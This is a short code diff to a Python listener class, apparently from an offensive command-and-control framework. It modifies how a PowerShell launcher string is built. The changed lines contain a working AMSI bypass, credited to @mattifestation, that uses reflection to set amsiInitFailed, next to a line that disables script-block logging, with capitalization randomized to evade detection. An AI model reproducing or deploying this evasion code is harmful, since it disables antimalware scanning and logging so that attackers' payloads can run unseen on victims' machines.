@@ -209,11 +209,11 @@ class Listener:
                     launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
-                    launcher += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    launcher += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
                     launcher += "'System.Management.Automation.AmsiUtils'"
-                    launcher += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
+                    launcher += helpers.randomize_capitalization(');$Ref.GetField(')
                     launcher += "'amsiInitFailed','NonPublic,Static'"
-                    launcher += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    launcher += helpers.randomize_capitalization(").SetValue($null,$true);")
                     launcher += "};"
                     launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
